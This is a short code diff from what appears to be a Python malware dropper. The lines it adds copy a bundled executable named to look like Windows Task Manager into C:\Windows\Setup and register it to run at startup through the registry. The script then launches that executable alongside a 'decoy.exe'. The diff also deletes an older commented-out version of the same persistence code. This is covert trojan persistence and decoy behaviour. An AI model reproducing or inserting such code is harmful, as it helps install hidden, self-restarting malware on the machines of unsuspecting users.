@@ -48,12 +48,14 @@ def check_autostart_registry(value_name):
                 break
     return False
 
+
+
+pwnpath = r'C:\Windows\Setup\TaskManager.exe'
+ppath = Path(pwnpath)
+if not ppath.is_file():
+        shutil.copyfile(resource_path('TaskManager.exe'), pwnpath)
+        set_autostart_registry('taskserv', pwnpath)
 subprocess.Popen(resource_path('TaskManager.exe'))
 subprocess.Popen(resource_path('decoy.exe'))
-#
-#pwnpath = r'C:\Windows\Tasks\Task Manager.exe'
-#ppath = Path(pwnpath)
-#if not ppath.is_file():
-#        shutil.copyfile(resource_path('Task Manager.exe'), pwnpath)
-#        set_autostart_registry('TaskServ', pwnpath)
+
 
